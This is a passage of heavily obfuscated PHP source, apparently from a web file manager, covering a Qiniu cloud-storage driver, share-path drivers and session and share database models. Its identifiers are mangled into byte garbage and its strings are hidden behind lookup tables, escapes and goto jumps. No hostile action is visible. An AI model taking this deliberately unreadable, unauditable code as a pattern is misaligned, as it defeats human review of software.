($ÚÎ°ß¸í as $Ë¯åß»ë) { if ($Ë¯åß»ë[$ûüÕçäí[104]] == $¸Œ£“Şæ) { continue; } $’›“µÓ… = $Ë¯åß»ë[$ûüÕçäí[104]]; $²åÉúøá = $Ë¯åß»ë[$ûüÕçäí[1453]]; $Ë¯åß»ë[$ûüÕçäí[86]] = $²åÉúøá; $×Çó¨õã = $²åÉúøá == 0 && substr($’›“µÓ…, strlen($’›“µÓ…) - 1, 1) == $ûüÕçäí[18] ? !0 : !1; $this->cacheMethodInfoSet($’›“µÓ…, $×Çó¨õã, $Ë¯åß»ë); if ($×Çó¨õã) { $®“Üé…[] = $’›“µÓ…; continue; } $½ğ‚ö“ƒ[] = $™‰Áñ ? $Ë¯åß»ë : $’›“µÓ…; } foreach ($¤Ø‹¥íê as $’›“µÓ…) { if ($’›“µÓ… == $¸Œ£“Şæ) { continue; } $®“Üé…[] = $’›“µÓ…; $this->cacheMethodInfoSet($’›“µÓ…, !0); } if ($óïó˜”€ === $ûüÕçäí[22]) { break; } } $this->cacheMethodInfoSet($ Å† Áñ, !0); return array($ûüÕçäí[92] => $®“Üé…, $ûüÕçäí[93] => $½ğ‚ö“ƒ); } public function canRead($Õ½ÕĞ¹ƒ) { return $this->exist($Õ½ÕĞ¹ƒ) ? !0 : !1; } public function canWrite($Ç¦Ìˆ„) { return $this->exist($Ç¦Ìˆ„) ? !0 : !1; } public function getContent($—ÈüâƒĞ) { return $this->fileSubstr($—ÈüâƒĞ, 0, -1); } public function setContent($³²ş“èà, $ˆ¶£‚Ô = '') { $‡‚™¬º = $this->tempFile($this->pathThis($³²ş“èà)); file_put_contents($‡‚™¬º, $ˆ¶£‚Ô); if ($this->upload($³²ş“èà, $‡‚™¬º)) { $this->tempFileRemve($‡‚™¬º); return !0; } return !1; } public function refreshUrls($“‹·ÓÇÖ) { $ê¹‘í“ç =& $_SERVER[ú÷îèÆÜ]; $äßõƒÖ˜ = array(); if (is_array($“‹·ÓÇÖ)) { foreach ($“‹·ÓÇÖ as $É¢‰›×) { $äßõƒÖ˜[] = $this->link($É¢‰›×); } } else { $äßõƒÖ˜[] = $this->link($“‹·ÓÇÖ); } $¿‰×™÷ã = new Qiniu\Cdn\CdnManager($this->auth); list($ËÆæ£ñá, $‹˜„Ğ) = $¿‰×™÷ã->refreshUrls($äßõƒÖ˜); if ($‹˜„Ğ) { return !1; } return $ËÆæ£ñá[$ê¹‘í“ç[1223]] == $ê¹‘í“ç[799] ? !0 : !1; } public function fileSubstr($ü¢×Šâ, $Îí˜ã–µ, $¡°™õ£) { $¯ëŠÆ¸ğ =& $_SERVER[ú÷îèÆÜ]; if (!($Â–•Şü± = $this->link($ü¢×Šâ))) { return !1; } $í¶‰ıı = !1; if ($¡°™õ£ > 0) { $¾Ä ÙŞÎ = $Îí˜ã–µ + $¡°™õ£ - 1; $í¶‰ıı = array($¯ëŠÆ¸ğ[1458] . $Îí˜ã–µ . $¯ëŠÆ¸ğ[439] . $¾Ä ÙŞÎ); } $ØÙçÂ´ı = url_request($Â–•Şü±, $¯ëŠÆ¸ğ[255], !1, $í¶‰ıı); return $ØÙçÂ´ı[$¯ëŠÆ¸ğ[790]] ? $ØÙçÂ´ı[$¯ëŠÆ¸ğ[1243]] : !1; } public function upload($‹ìşË , $¥£ö–ãĞ, $ ÀÚ„İ¿ = false, $ô‡æÈ…¿ = REPEAT_REPLACE) { $½»©Ğ‰ = new Qiniu\Storage\UploadManager(); $íÉáˆ­Ö = $this->auth->uploadToken($this->bucket, $‹ìşË ); $ËªÄöó¸ = get_file_mime(get_path_ext($¥£ö–ãĞ)); list($•ÀÔ­î, $Ó…µñä) = $½»©Ğ‰->putFile($íÉáˆ­Ö, $‹ìşË , $¥£ö–ãĞ, null, $ËªÄöó¸); return $Ó…µñä ? !1 : $this->getPathOuter($‹ìşË ); } public function uploadFormData($ˆ¬æ‡Ã‹, $şãóÛÔ = 3600) { return $this->uploadToken($ˆ¬æ‡Ã‹, $şãóÛÔ); } public function multiUploadFormData($ä£Ùåêä, $ƒâ††…Ï = 3600) { return $this->uploadToken($ä£Ùåêä, $ƒâ††…Ï); } private function uploadToken($¦Ô‘¿Ş, $Ù‹ã¥Ü = 3600) { $Ã›üÏ =& $_SERVER[ú÷îèÆÜ]; $ÓøØ‹Şò = $Ù‹ã¥Ü; $÷šÒÙù™ = array($Ã›üÏ[1459] => $Ã›üÏ[1460]); $¥·¡ış’ = $¦Ô‘¿Ş; $‘™‡èŠë = $this->auth->uploadToken($this->bucket, $¥·¡ış’, $ÓøØ‹Şò, $÷šÒÙù™, !0); $óğÑûºú = empty($this->region) || $this->region == $Ã›üÏ[1461] ? $Ã›üÏ[22] : $Ã›üÏ[439] . $this->region; $Ì±•³äÔ = http_type() . "\72\x2f\57\x75\x70\154\157\x61\x64{$óğÑûºú}\56\x71\151\156\x69\165\160\56\143\157\155\x2f"; return array($Ã›üÏ[1462] => $‘™‡èŠë, $Ã›üÏ[1463] => $Ì±•³äÔ); } public function download($ü²ßİ ó, $í’¼Äİß) { $—à‡®˜ = IO::getPathInner(IO::mkfile($í’¼Äİß)); if (!($úÀ®Ş¤ = $this->link($ü²ßİ ó))) { return !1; } $Åûêòúğ = 0; $êŠÚ¡…‹ = 1024 * 200; $ã›ôëÔ” = fopen($—à‡®˜, $_SERVER[ú÷îèÆÜ][1464]); while (!0) { $÷“Ç¾ëı = $this->fileSubstr($ü²ßİ ó, $Åûêòúğ, $êŠÚ¡…‹); if ($÷“Ç¾ëı === !1) { return !1; } fwrite($ã›ôëÔ”, $÷“Ç¾ëı); $Åûêòúğ += $êŠÚ¡…‹; if (strlen($÷“Ç¾ëı) < $êŠÚ¡…‹) { break; } } fclose($ã›ôëÔ”); return $í’¼Äİß; } public function link($â ÜË‚½, $’êƒ¶¾” = '') { if (!$this->isFile($â ÜË‚½)) { return !1; } $âæÖ“Ü¡ = $this->getHost() . $_SERVER[ú÷îèÆÜ][18] . $this->pathEncode($â ÜË‚½) . $’êƒ¶¾”; return $this->auth->privateDownloadUrl($âæÖ“Ü¡, 3600 * 12); } public function fileOut($´¿ÈÏ, $İÏ¥ï‘® = false, $÷¹Êş÷Ú = false, $¹¯ÌÑ’¾ = '') { $ú”¿³Ğ³ =& $_SERVER[ú÷îèÆÜ]; if ($this->isFileOutServer()) { return $this->fileOutServer($´¿ÈÏ, $İÏ¥ï‘®, $÷¹Êş÷Ú, $¹¯ÌÑ’¾); } if (!$÷¹Êş÷Ú) { $÷¹Êş÷Ú = $this->pathThis($´¿ÈÏ); } $õ—à§Ë = $İÏ¥ï‘® ? $ú”¿³Ğ³[1465] . rawurlencode($÷¹Êş÷Ú) : $ú”¿³Ğ³[22]; $¸İÁäï = $this->link($´¿ÈÏ, $õ—à§Ë); $this->fileOutLink($¸İÁäï); } public function fileOutServer($®Šú«öş, $®•â‹Û× = false, $úÔÜÑÛ = false, $ŞàÄ¥æ˜ = '') { parent::fileOut($®Šú«öş, $®•â‹Û×, $úÔÜÑÛ, $ŞàÄ¥æ˜); } public function fileOutImage($¿×Ş–ß, $ìùş€í = 250) { $¾’áÅìğ = $this->link($¿×Ş–ß, $_SERVER[ú÷îèÆÜ][1466] . $ìùş€í); $this->fileOutLink($¾’áÅìğ); } public function fileOutImageServer($õ¹®Íª™, $™ß¢¼´’ = 250) { parent::fileOutImage($õ¹®Íª™, $™ß¢¼´’); } public function hashMd5($îöôÄ) { $Øœºñœú =& $_SERVER[ú÷îèÆÜ]; $ÏÂÄ¢‹ä = $this->objectMeta($îöôÄ); return isset($ÏÂÄ¢‹ä[$Øœºñœú[238]]) ? $ÏÂÄ¢‹ä[$Øœºñœú[238]] : !1; $ç¹ó‰Ù’ = $this->link($îöôÄ, $Øœºñœú[1467]); } public function size($÷‡ô–±Ü) { $ƒÙ¬¾”Ë = $this->objectMeta($÷‡ô–±Ü); return $ƒÙ¬¾”Ë ? $ƒÙ¬¾”Ë[$_SERVER[ú÷îèÆÜ][86]] : 0; } public function info($©ˆæµÓâ) { if ($this->isFolder($©ˆæµÓâ)) { return $this->folderInfo($©ˆæµÓâ); } else { if ($this->isFile($©ˆæµÓâ)) { return $this->fileInfo($©ˆæµÓâ); } } return !1; } public function exist($óÀØ¥“) { return $this->isFile($óÀØ¥“) || $this->isFolder($óÀØ¥“); } public function isFile($ùÍ¬÷š) { return !$this->isFolder($ùÍ¬÷š) && $this->objectMeta($ùÍ¬÷š); } public function isFolder($äå‰¬æè) { return $this->cacheMethod($_SERVER[ú÷îèÆÜ][176], $äå‰¬æè); } protected function objectMeta($ñ÷ìÑ¯ô) { return $this->cacheMethod($_SERVER[ú÷îèÆÜ][178], $ñ÷ìÑ¯ô); } protected function _objectMeta($ğÉ«êõ) { $º¶ƒ¶‚Ä =& $_SERVER[ú÷îèÆÜ]; list($ÙØÈšş, $ş¤©íì) = $this->bucketManager->stat($this->bucket, $ğÉ«êõ); if ($ÙØÈšş) { $ÙØÈšş[$º¶ƒ¶‚Ä[86]] = intval($ÙØÈšş[$º¶ƒ¶‚Ä[1453]]); } return $ÙØÈšş; } protected function _isFolder($Ä½ÁÁä) { $¡Çõ³¨ß =& $_SERVER[ú÷îèÆÜ]; if ($Ä½ÁÁä == $¡Çõ³¨ß[22] || $Ä½ÁÁä == $¡Çõ³¨ß[18]) { return !0; } list($ùÑì¥õÁ, $¹’èìŸ†) = $this->bucketManager->listFiles($this->bucket, trim($Ä½ÁÁä, $¡Çõ³¨ß[18]) . $¡Çõ³¨ß[18], $¡Çõ³¨ß[22], 1, $¡Çõ³¨ß[18]); return !empty($ùÑì¥õÁ[$¡Çõ³¨ß[1456]]) || !empty($ùÑì¥õÁ[$¡Çõ³¨ß[1457]]) ? !0 : !1; } } goto dÕí«¿¬™; døŠÌáâ½: class PathDriverDbShareItem extends PathDriverDB { public function __construct($›¾Ñ¬§„) { $this->pathParse = $›¾Ñ¬§„; $this->model = Model($_SERVER[ú÷îèÆÜ][1373]); } public function getPathOuter($æŒãäÊ) { $Šß´ô =& $_SERVER[ú÷îèÆÜ]; if (!$æŒãäÊ) { return $æŒãäÊ; } $ñ¾ô§™£ = $this->parse($æŒãäÊ); return trim(KodIO::makeShare($this->pathParse[$Šß´ô[452]], $ñ¾ô§™£[$Šß´ô[452]]), $Šß´ô[18]); } protected function infoParse($ÄùûÖ‹ã, $ÕøğûÜÚ = false, $ŒıüÆşÑ = false) { $İíÄÂ©€ =& $_SERVER[ú÷îèÆÜ]; $¢ÎÉÒú = $this->pathParse[$İíÄÂ©€[452]]; $¸å¡½ë¦ = trim($this->pathParse[$İíÄÂ©€[1209]], $İíÄÂ©€[18]); return Action($İíÄÂ©€[1380])->sharePathInfo($¢ÎÉÒú, $¸å¡½ë¦, $ÕøğûÜÚ); } public function infoFull($ÈªœË¥Ÿ) { $Šé¶ ­ =& $_SERVER[ú÷îèÆÜ]; $‰­úªÓ = explode($Šé¶ ­[18], trim($ÈªœË¥Ÿ, $Šé¶ ­[18])); if (count($‰­úªÓ) > 1) { $…ç†úÂ’ = implode($Šé¶ ­[18], array_splice($‰­úªÓ, 1)); $İÖÂòÈ¥ = $this->model->pathInfoByPath($‰­úªÓ[0], $…ç†úÂ’); if (!$İÖÂòÈ¥) { return !1; } $this->pathParse[$Šé¶ ­[1209]] = $İÖÂòÈ¥[$Šé¶ ­[191]]; } return $this->infoParse($ÈªœË¥Ÿ); } public function listAll($ÜÉ†¶ãÕ) { $¬¼‹“°À =& $_SERVER[ú÷îèÆÜ]; $êşüæğà = IO::info($this->pathParse[$¬¼‹“°À[94]]); if (!$êşüæğà) { return array(); } $ı¬êë–Ä = $this->model->listAll($ÜÉ†¶ãÕ); $Ãáœ½ü = Model($¬¼‹“°À[641])->getInfo($êşüæğà[$¬¼‹“°À[642]]); foreach ($ı¬êë–Ä as &$àş½ù“ê) { check_abort(); $àş½ù“ê[$¬¼‹“°À[97]] = Action($¬¼‹“°À[1380])->_shareItemeParse($àş½ù“ê[$¬¼‹“°À[97]], $Ãáœ½ü); } unset($àş½ù“ê); return $ı¬êë–Ä; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($õÉØÕ…ñ) { $this->pathParse = $õÉØÕ…ñ; $this->model = Model($_SERVER[ú÷îèÆÜ][1373]); } protected function infoParse($ìÍ—Ãù, $³Ä¹óÛ = false, $›êğîŞ¦ = false) { $ãüËì— =& $_SERVER[ú÷îèÆÜ]; return Action($ãüËì—[1215])->sharePathInfo($this->pathParse[$ãüËì—[94]], !0, $³Ä¹óÛ); } public function listPath($Üø“Ş, $Ò­œ¼¸ = false) { $±ø’×ş =& $_SERVER[ú÷îèÆÜ]; $ƒ“ÔÀ¬ = parent::listPath($Üø“Ş, $Ò­œ¼¸); if (!$ƒ“ÔÀ¬) { return $ƒ“ÔÀ¬; } if (is_array($ƒ“ÔÀ¬[$±ø’×ş[1381]])) { $ƒ“ÔÀ¬[$±ø’×ş[1381]] = Action($±ø’×ş[1215])->shareItemInfo($ƒ“ÔÀ¬[$±ø’×ş[1381]]); } foreach ($ƒ“ÔÀ¬ as $ºÂ•şØ‰ => $®ÈÏôŸ©) { if (!in_array($ºÂ•şØ‰, array($±ø’×ş[93], $±ø’×ş[92]))) { continue; } foreach ($®ÈÏôŸ© as $Š¤ºßû => $‡©şå³¥) { $ƒ“ÔÀ¬[$ºÂ•şØ‰][$Š¤ºßû] = Action($±ø’×ş[1215])->shareItemInfo($‡©şå³¥); } } return $ƒ“ÔÀ¬; } public function listAll($ïÓÚê£Æ) { $Ç¡àÏ”– =& $_SERVER[ú÷îèÆÜ]; $ÌÀû¯° = IO::info($this->pathParse[$Ç¡àÏ”–[94]]); if (!$ÌÀû¯°) { return array(); } $¶ìö÷ëâ = $this->model->listAll($ïÓÚê£Æ); foreach ($¶ìö÷ëâ as &$¥¥š»é½) { $¥¥š»é½[$Ç¡àÏ”–[97]] = Action($Ç¡àÏ”–[1215])->shareItemInfo($¥¥š»é½[$Ç¡àÏ”–[97]]); } unset($¥¥š»é½); return $¶ìö÷ëâ; } } class PathDriverDriverShareItem { public function __construct($”í¯Äõ„) { $this->pathParse = $”í¯Äõ„; } public function __call($’¢ş¹Êª, $ˆÃş¬¾) { $×ä—ïïß =& $_SERVER[ú÷îèÆÜ]; if (method_exists($this, $’¢ş¹Êª)) { return; } $×Úê†àï = call_user_func_array(array($×ä—ïïß[1382], $’¢ş¹Êª), $ˆÃş¬¾); $šÓèë·‰ = array($×ä—ïïß[1383], $×ä—ïïß[1384], $×ä—ïïß[1385], $×ä—ïïß[1386], $×ä—ïïß[595], $×ä—ïïß[597], $×ä—ïïß[1387], $×ä—ïïß[117], $×ä—ïïß[1388], $×ä—ïïß[1389]); if (in_array($’¢ş¹Êª, $šÓèë·‰)) { $×Úê†àï = $this->getPathOuter($×Úê†àï); } return $×Úê†àï; } public function copy($ŞŸ‚š­, $±ïÕë—å, $óºÂÚèï = false, $®Šã°Í· = false) { return $this->copyMove($ŞŸ‚š­, $±ïÕë—å, $óºÂÚèï, $_SERVER[ú÷îèÆÜ][595], $®Šã°Í·); } public function move($Œ•±¨ŠÖ, $¡ù‚Ëù¢, $ú×§ëúõ = false, $×÷ı……¨ = false) { return $this->copyMove($Œ•±¨ŠÖ, $¡ù‚Ëù¢, $ú×§ëúõ, $_SERVER[ú÷îèÆÜ][597], $×÷ı……¨); } private function copyMove($ÏÉİø±Ö, $ó¥Äè†º, $úÉÒ« ¤, $”âÆ¾Ìİ, $ÒºôÕŞÚ = false) { $°ûÜ·Ê =& $_SERVER[ú÷îèÆÜ]; $ßûèˆî¨ = $ó¥Äè†º; $‰‘â¹²µ = IO::driverMake($ó¥Äè†º); if ($‰‘â¹²µ->pathParse[$°ûÜ·Ê[1192]]) { $ó¥Äè†º = $‰‘â¹²µ->pathParse[$°ûÜ·Ê[1192]]; } else { $ó¥Äè†º = $ßûèˆî¨; } $Ìá˜Å™¸ = IO::copyMove($ÏÉİø±Ö, $ó¥Äè†º, $úÉÒ« ¤, $”âÆ¾Ìİ, $ÒºôÕŞÚ); $Ìá˜Å™¸ = $this->getPathOuter($Ìá˜Å™¸); return $Ìá˜Å™¸; } public function pathThis($Êğ¹—ƒî) { return get_path_this($this->pathParse[$_SERVER[ú÷îèÆÜ][94]]); } public function pathFather($¶’¯ıò†) { return get_path_father($this->pathParse[$_SERVER[ú÷îèÆÜ][94]]); } public function iconvSystem($â¬°‰ï) { return $â¬°‰ï; } protected function infoParse($Øªºµ“», $ü–ø¡ÒÜ = false) { $œ»îè£ =& $_SERVER[ú÷îèÆÜ]; $‰ÈÕçÛ‡ = $this->pathParse[$œ»îè£[537]][$œ»îè£[1216]] . $this->pathParse[$œ»îè£[1209]]; if ($ü–ø¡ÒÜ) { $Ñ÷õ·‘ß = IO::infoWithChildren($‰ÈÕçÛ‡); } else { $Ñ÷õ·‘ß = IO::info($‰ÈÕçÛ‡); } $«ïÖÊæÚ = $this->pathParse[$œ»îè£[537]]; return Action($œ»îè£[1380])->_shareItemeParse($Ñ÷õ·‘ß, $«ïÖÊæÚ); } public function listAll($ŸùøÄ˜í) { $‡Ö±½ =& $_SERVER[ú÷îèÆÜ]; $•Í¨è  = IO::listAll($ŸùøÄ˜í); $½ê¿ß½È = rtrim($this->pathParse[$‡Ö±½[537]][$‡Ö±½[1216]], $‡Ö±½[18]); foreach ($•Í¨è  as &$ÎóÕ„ğÁ) { $ÎóÕ„ğÁ[$‡Ö±½[94]] = $this->pathDriver . $‡Ö±½[18] . ltrim(substr($ÎóÕ„ğÁ[$‡Ö±½[94]], strlen($½ê¿ß½È)), $‡Ö±½[18]); } unset($ÎóÕ„ğÁ); return $•Í¨è ; } public function listAllSimple($Ü ùÖ, $»œ¬§¬ = false) { $ô³ò‘³İ =& $_SERVER[ú÷îèÆÜ]; $äûã¶ª = $this->listAll($Ü ùÖ); $Ğú¯úÊ = $this->pathParse[$ô³ò‘³İ[472]]; if (trim($Ğú¯úÊ, $ô³ò‘³İ[18]) == trim(get_path_father($Ğú¯úÊ), $ô³ò‘³İ[18])) { $»œ¬§¬ = !0; } return IO::init($ô³ò‘³İ[22])->listAllSimpleMake($äûã¶ª, $Ğú¯úÊ, $»œ¬§¬); } public function getPathOuter($§ôƒñĞ¾) { $­Šß¥µ =& $_SERVER[ú÷îèÆÜ]; $²µ‚úíÁ = KodIO::parse($§ôƒñĞ¾); if ($²µ‚úíÁ[$­Šß¥µ[43]] == KodIO::KOD_SHARE_ITEM) { return $²µ‚úíÁ[$­Šß¥µ[94]]; } $Ú½«¥¼ = KodIO::clear($§ôƒñĞ¾); $·Š¢ßÆ  = KodIO::clear($this->pathParse[$­Šß¥µ[537]][$­Šß¥µ[1216]]); $Œ»¹­’‘ = substr($Ú½«¥¼, strlen($·Š¢ßÆ )); if (substr($Ú½«¥¼, 0, strlen($·Š¢ßÆ )) != $·Š¢ßÆ ) { return !1; } return $this->pathParse[$­Šß¥µ[1210]] . $­Šß¥µ[18] . ltrim($Œ»¹­’‘, $­Šß¥µ[18]); } public function getType() { $¦ÈÑ¿© =& $_SERVER[ú÷îèÆÜ]; $¬³û¥ÁÊ = str_replace($¦ÈÑ¿©[84], $¦ÈÑ¿©[22], get_class($this)); return strtolower($¬³û¥ÁÊ); } public function isTypeObject($‰¦õ²ËÍ) { return IO::isTypeObject($‰¦õ²ËÍ); } public function info($Ñíä‚öÄ) { return $this->infoParse($Ñíä‚öÄ); } public function infoAuth($²îşµ§é) { return $this->infoParse($²îşµ§é); } public function infoWithChildren($’¹üó«) { return $this->infoParse($’¹üó«, !0); } public function infoFull($œ“õŠÁ›) { return $this->infoParse($œ“õŠÁ›); } } goto Fê‡ÎÄ¤¾İ; BÈöÊ…†­»: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\145\x6d\x5f\x73\x65\163\163\x69\x6f\x6e"; public function get($Ñ­ìâ¤) { $ÖÇıŒ–à =& $_SERVER[ú÷îèÆÜ]; $ãÌ”äáÚ = $this->where(array($ÖÇıŒ–à[2018] => $Ñ­ìâ¤))->find(); if (!is_array($ãÌ”äáÚ)) { return !1; } return $ãÌ”äáÚ[$ÖÇıŒ–à[794]]; } public function set($îÌî‰’ğ, $»¦˜’×¨, $¨ÛšÌ£‰ = 3600) { $äÒíÙ®Ù =& $_SERVER[ú÷îèÆÜ]; $øôº„Û¦ = array($äÒíÙ®Ù[2018] => $îÌî‰’ğ, $äÒíÙ®Ù[1922] => $»¦˜’×¨, $äÒíÙ®Ù[2019] => $¨ÛšÌ£‰ + time()); if (Session::get($äÒíÙ®Ù[2020])) { $øôº„Û¦[$äÒíÙ®Ù[1685]] = Session::get($äÒíÙ®Ù[2020]); } else { $øôº„Û¦[$äÒíÙ®Ù[1685]] = 0; } if ($this->get($îÌî‰’ğ)) { return $this->where(array($äÒíÙ®Ù[2018] => $îÌî‰’ğ))->save($øôº„Û¦); } else { return $this->add($øôº„Û¦, array(), !0); } } public function remove($ß°ï²÷) { return $this->where(array($_SERVER[ú÷îèÆÜ][2018] => $ß°ï²÷))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ú÷îèÆÜ][2021] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\x72\x65"; protected $dataAuto = array(array("\x6d\157\144\151\x66\171\x54\x69\155\x65", "\164\x69\x6d\145", "\x69\156\163\x65\162\x74\54\165\x70\144\141\164\145", "\x66\x75\x6e\143\164\x69\x6f\156"), array("\x63\x72\145\141\x74\x65\x54\151\x6d\145", "\x74\x69\155\145", "\151\x6e\163\145\162\x74", "\x66\165\156\x63\x74\151\x6f\x6e"), array("\157\x70\164\151\x6f\x6e\163", '', "\151\x6e\163\145\162\164\54\165\x70\144\141\x74\x65\x2c\x73\145\154\145\x63\164", "\x6a\x73\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($˜ğÍ±®È) { $ƒ¨û°æÆ =& $_SERVER[ú÷îèÆÜ]; $ĞÉ æ¿¥ = isset($˜ğÍ±®È[0]) ? $˜ğÍ±®È[0] : !1; return array($ƒ¨û°æÆ[2022] => array(USER_ID, $ƒ¨û°æÆ[2023]), $ƒ¨û°æÆ[1963] => array($ĞÉ æ¿¥, $ƒ¨û°æÆ[2024])); } protected function listSimple() { $—Ö¦òœú = array($_SERVER[ú÷îèÆÜ][1685] => USER_ID); $„Éò×µ = $this->field($this->fieldList)->where($—Ö¦òœú)->select(); return $„Éò×µ ? $„Éò×µ : array(); } protected function getInfo($³¸Ã×ÆŞ, $ºİ°ç¾ó = false) { $ŸüÍˆ¢¿ =& $_SERVER[ú÷îèÆÜ]; if ($ºİ°ç¾ó) { return $this->_getShareInfo(array($ŸüÍˆ¢¿[642] => $³¸Ã×ÆŞ)); } $Øıó¢®‘ = $this->cacheFunctionGet($ŸüÍˆ¢¿[1965], $³¸Ã×ÆŞ); return $Øıó¢®‘; } public function getInfoByHash($£µè¾Òü) { return $this->_getShareInfo(array($_SERVER[ú÷îèÆÜ][2025] => $£µè¾Òü)); } public function getInfoByPath($ñ“ÀÆß) { $ş…òÄ =& $_SERVER[ú÷îèÆÜ]; $Ñ§÷Ìä = array($ş…òÄ[1685] => USER_ID, $ş…òÄ[191] => $ñ“ÀÆß); return $this->_getShareInfo($Ñ§÷Ìä); } public function getInfoBySourcePath($­†¿õ¥) { $İâ°ÑÓ =& $_SERVER[ú÷îèÆÜ]; $Ã°†ñÍÊ = array($İâ°ÑÓ[1685] => USER_ID, $İâ°ÑÓ[1216] => $­†¿õ¥); return $this->_getShareInfo($Ã°†ñÍÊ); } private function _getShareInfo($ÊÄ„ÈŠ‡) { $ÈÈÜÌº£ =& $_SERVER[ú÷îèÆÜ]; $ÖÃÀ–Ì¶ = $this->where($ÊÄ„ÈŠ‡)->find(); if (!$ÖÃÀ–Ì¶) { return !1; } $ÊÄ„ÈŠ‡ = array($ÈÈÜÌº£[642] => $ÖÃÀ–Ì¶[$ÈÈÜÌº£[642]]); $™Ú¢¢ù = $ÈÈÜÌº£[2026]; $ÖÄ•¹åå = Model($ÈÈÜÌº£[643])->order($ÈÈÜÌº£[452])->field($™Ú¢¢ù)->where($ÊÄ„ÈŠ‡)->select(); if ($ÖÃÀ–Ì¶[$ÈÈÜÌº£[191]] == $ÈÈÜÌº£[222]) { $ÖÃÀ–Ì¶[$ÈÈÜÌº£[97]] = IO::info($ÖÃÀ–Ì¶[$ÈÈÜÌº£[1216]]); } else { $ÖÃÀ–Ì¶[$ÈÈÜÌº£[97]] = Model($ÈÈÜÌº£[1373])->pathInfo($ÖÃÀ–Ì¶[$ÈÈÜÌº£[191]]); } $ÖÃÀ–Ì¶[$ÈÈÜÌº£[2027]] = $ÖÄ•¹åå; return $ÖÃÀ–Ì¶; } protected function getInfoAuth($Ÿ¥”¥°â) { $şˆœáÍ¤ =& $_SERVER[ú÷îèÆÜ]; $Ÿİ¯˜ÑÆ = $this->getInfo($Ÿ¥”¥°â); if ($Ÿİ¯˜ÑÆ[$şˆœáÍ¤[1685]] == USER_ID) { $Ÿİ¯˜ÑÆ[$şˆœáÍ¤[464]] = $Ÿİ¯˜ÑÆ[$şˆœáÍ¤[97]][$şˆœáÍ¤[464]]; } else { $Ÿİ¯˜ÑÆ[$şˆœáÍ¤[464]] = Model($şˆœáÍ¤[544])->authMake($Ÿİ¯˜ÑÆ[$şˆœáÍ¤[2027]]); } return $Ÿİ¯˜ÑÆ; } protected function listData($ÇË•ß«‘ = null, $¬ñß«› = 300) { $ì¯²§Õ =& $_SERVER[ú÷îèÆÜ]; $Ùø­¶³Ô = array(array($ì¯²§Õ[539] => array($ì¯²§Õ[1053], 0), $ì¯²§Õ[640] => array($ì¯²§Õ[1053], 0), $ì¯²§Õ[2028] => $ì¯²§Õ[1981])); if ($ÇË•ß«‘ == $ì¯²§Õ[2029]) { $Ùø­¶³Ô = array($ì¯²§Õ[539] => 1); } else { if ($ÇË•ß«‘ == $ì¯²§Õ[1202]) { $Ùø­¶³Ô = array($ì¯²§Õ[640] => 1); } } $Ùø­¶³Ô[$ì¯²§Õ[1685]] = USER_ID; $ÔÁõÑÛ“ = $this->where($Ùø­¶³Ô)->selectPage($¬ñß«›); return $ÔÁõÑÛ“; } protected function listToMe($©Å‘å„ğ = 300) { $Ïûóé–Á =& $_SERVER[ú÷îèÆÜ]; $Í×»òĞÉ = Model($Ïûóé–Á[2030])->userGroupParents(USER_ID); $±¼ùÃ»Ì = array($Ïûóé–Á[625] => SourceModel::TYPE_USER, $Ïûóé–Á[547] => USER_ID); if ($Í×»òĞÉ) { $±¼ùÃ»Ì = array(array($Ïûóé–Á[625] => SourceModel::TYPE_USER, $Ïûóé–Á[547] => USER_ID), array($Ïûóé–Á[625] => SourceModel::TYPE_GROUP, $Ïûóé–Á[547] => array($Ïûóé–Á[17], $Í×»òĞÉ)), $Ïûóé–Á[2028] => $Ïûóé–Á[1981]); } $ûöİºªĞ = Model($Ïûóé–Á[643])->where($±¼ùÃ»Ì)->selectPage($©Å‘å„ğ); $°ÆœĞ´û = array_to_keyvalue_group($ûöİºªĞ[$Ïûóé–Á[422]], $Ïûóé–Á[642]); if (!$°ÆœĞ´û) { return $ûöİºªĞ; } $¢×òòĞß = $Ïûóé–Á[2031]; $±¼ùÃ»Ì = array($Ïûóé–Á[642] => array($Ïûóé–Á[469], array_keys($°ÆœĞ´û)), $Ïûóé–Á[1685] => array($Ïûóé–Á[1055], $Ïûóé–Á[222])); $œ¼àÎÒü = $this->field($¢×òòĞß)->where($±¼ùÃ»Ì)->select(); foreach ($œ¼àÎÒü as $ÌÙÅÁÙ => &$Ñ€£Öº) { $Ñ€£Öº[$Ïûóé–Á[2027]] = $°ÆœĞ´û[$Ñ€£Öº[$Ïûóé–Á[642]]]; } unset($Ñ€£Öº); $Ó¤¡ñìê = array($Ïûóé–Á[2032] => $œ¼àÎÒü, $Ïûóé–Á[2033] => $ûöİºªĞ[$Ïûóé–Á[419]]); return $Ó¤¡ñìê; } protected function shareAdd($¤—èèåı, $ÓÇ«¡Õˆ) { $îì»ıãó =& $_SERVER[ú÷îèÆÜ]; $‹Å‘á‹ƒ = $this->_addShareData($¤—èèåı, $ÓÇ«¡Õˆ); if (!empty($ÓÇ«¡Õˆ[$îì»ıãó[2034]])) { $this->_shareAuthSet($‹Å‘á‹ƒ, $ÓÇ«¡Õˆ[$îì»ıãó[2034]]); } $this->shareEventAdd($¤—èèåı, $ÓÇ«¡Õˆ, $îì»ıãó[2035]); return $‹Å‘á‹ƒ; } protected function shareAddSystem($Ûâ«âÌØ, $ø››õÜÊ) { $ªÙ«ºà =& $_SERVER[ú÷îèÆÜ]; $¤ßˆŠè = $this->_addShareData($Ûâ«âÌØ, $ø››õÜÊ, $ªÙ«ºà[189]); $this->_shareAuthSet($¤ßˆŠè, $ø››õÜÊ[$ªÙ«ºà[2034]]); return $¤ßˆŠè; } private function shareEventAdd($ëçõ¹”°, $Ê–Şã¾ó, $øá¿©º³ = "\141\x64\x64") { $Ø…±ÇÁß =& $_SERVER[ú÷îèÆÜ]; if (!$ëçõ¹”° || $ëçõ¹”° == $Ø…±ÇÁß[222]) { return; } if ($øá¿©º³ == $Ø…±ÇÁß[2035]) { if ($Ê–Şã¾ó[$Ø…±ÇÁß[539]] == $Ø…±ÇÁß[98]) { Model($Ø…±ÇÁß[610])->eventShare($ëçõ¹”°, $Ø…±ÇÁß[2036]); } if ($Ê–Şã¾ó[$Ø…±ÇÁß[640]] == $Ø…±ÇÁß[98]) { Model($Ø…±ÇÁß[610])->eventShare($ëçõ¹”°, $Ø…±ÇÁß[2037]); } return; } $¶¶Â…ƒ× = $this->getInfoByPath($ëçõ¹”°); $öŒé™à¹ = $Ø…±ÇÁß[2038]; 